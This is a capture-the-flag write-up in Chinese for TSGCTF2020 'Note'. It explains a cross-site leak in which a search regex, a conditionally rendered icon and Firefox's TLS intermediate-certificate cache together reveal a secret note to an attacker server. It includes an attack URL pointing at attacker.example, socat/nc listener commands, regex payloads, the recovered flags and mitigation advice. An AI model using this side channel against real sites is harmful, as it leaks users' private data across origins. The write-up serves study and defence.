# TSGCTF2020 Note WP

## 题目简述

管理员机器人携带 flag 用户的会话 cookie 访问参赛者提交的 URL。前端从 URL 两个位置直接取配置：查询串被作为 JavaScript 正则表达式筛选笔记，fragment 被作为顶部图片地址：

```javascript
headerImg: document.location.hash.substring(1) || '',
search: document.location.search.substring(1) || '',

const re = new RegExp(this.search);
this.visibleNotes = this.allNotes.filter(({content}) => content.match(re));
```

DOM 没有把笔记内容发送给攻击者，但匹配到至少一条笔记时会渲染删除按钮，其 CSS 背景图片来自一个特定 HTTPS 站点。题目的核心是把“删除图标是否被请求”借 Firefox 的 TLS 中间证书缓存转换成可从攻击服务器观察的侧信道。

## 解题过程

构造管理员访问地址：

```text
http://challenge/?<用于匹配flag的正则>#https://attacker.example/<随机标识>
```

机器人进入页面后会用 cookie 请求 `/api/note`。若正则匹配 flag 笔记，Vue 创建笔记卡片和 `.x-icon`，浏览器便请求删除图标；若不匹配，图标请求不存在。与此同时，fragment 指定的顶部图片会连接攻击服务器。

删除图标在比赛环境中的证书由 `Let's Encrypt Authority X3` 中间 CA 签发，而页面上其余第三方资源使用不同的证书链。攻击服务器也准备一张由同一中间 CA 签发的叶证书，但 TLS 握手时故意只发送叶证书，不附带中间证书：

```bash
socat tcp-listen:8001,bind=0.0.0.0,fork,reuseaddr \
  system:'sleep 2; nc 127.0.0.1 5678'

socat openssl-listen:5678,fork,reuseaddr,certificate=cert.pem,key=privkey.pem,verify=0 \
  system:'nc 127.0.0.1 6789'
```

第一层监听先延迟约 2 秒，使删除图标有机会先加载。若正则匹配，Firefox 从图标站点的正常握手中取得并缓存中间证书；随后面对攻击服务器的不完整链时，能用缓存补全验证并继续发送 HTTP 请求。若不匹配，缓存中没有该中间证书，攻击服务器只能看到未完成的 TLS 连接，收不到 HTTP path。因此攻击端是否收到随机标识就是一个布尔 oracle。

Note1 可先用正则 `TSGCTF{.{n}.*}` 二分长度，再把某一位分成两个字符集合，例如：

```text
TSGCTF{.....[A-M].*}
TSGCTF{.....[N-Z0-9_].*}
```

每轮给两个查询分配不同随机 path，观察哪一个完成 HTTP 请求，二分出当前字符。仓库官方脚本恢复的 Note1 flag 为：

```text
TSGCTF{5H4LL_W3_ENCRYP7}
```

Note2 补丁在构造正则前删除 `{ } ( ) + *`，并把 flag 改为 `TSGCTF{5JFJMWOPOPW5E729}`。该修补没有消除侧信道，也仍允许 `^`、`.` 与字符类 `[]`。已知格式后，可以用 `^TSGCTF.` 匹配固定前缀中的左花括号，再写若干个点定位字符，按字符编号的 6 个二进制位分组查询：

```text
^TSGCTF.....[13579BDFHJLNPRTVXZ_]
```

当所有合法字符集合在下一位都不匹配时即到达右花括号。这样无需被过滤的量词，仍能逐位恢复 Note2 的 16 字符内容。

## 方法总结

这不是常见的响应时间 XS-Leak，而是资源加载条件与 TLS 状态缓存组合出的跨请求 oracle。搜索正则决定删除图标是否出现，图标连接决定 Firefox 是否缓存特定中间 CA，延迟后的攻击图片连接再把缓存状态暴露为“是否继续发送 HTTP”。仅删掉几个正则元字符无法修复根因；机器人应限制访问同源 URL、禁止任意外部图片，并隔离或禁用跨任务缓存。任何秘密相关的条件渲染、DNS、TLS、缓存或资源请求差异都应视为可观测输出。
